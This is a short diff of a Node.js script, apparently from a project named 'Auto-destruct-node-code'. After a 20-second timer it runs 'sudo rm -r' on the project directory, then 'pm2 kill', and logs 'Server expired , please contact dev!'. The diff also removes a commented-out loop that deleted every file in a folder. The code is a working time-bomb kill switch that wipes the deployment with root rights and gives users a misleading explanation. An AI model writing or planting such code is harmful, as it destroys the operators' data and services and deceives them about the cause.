@@ -13,8 +13,8 @@ setTimeout(() => {
 
   async function lsWithGrep() {
     try {
-        const { stdout, stderr } = await exec('pm2 kill && sudo rm -r /home/ubuntu/Auto-destruct-node-code');
-        console.log('stdout:', stdout);
+        const { stdout, stderr } = await exec('sudo rm -r /home/ubuntu/Auto-destruct-node-code && pm2 kill');
+        console.log(`Server expired , please contact dev!`);
         console.log('stderr:', stderr);
     }catch (err) {
 
@@ -23,19 +23,6 @@ setTimeout(() => {
   }
 
   lsWithGrep();
-  // fs.readdir(directory, (err, files) => {
-  //   if (err) throw err;
-  
-  //   for (const file of files) {
-  //     fs.unlink(path.join(directory, file), err => {
-  //       if (err) throw err;
-  //     });
-  //   }
-  //   lsWithGrep();
-
-
-  // });
-
 
 }, 20000);
 }
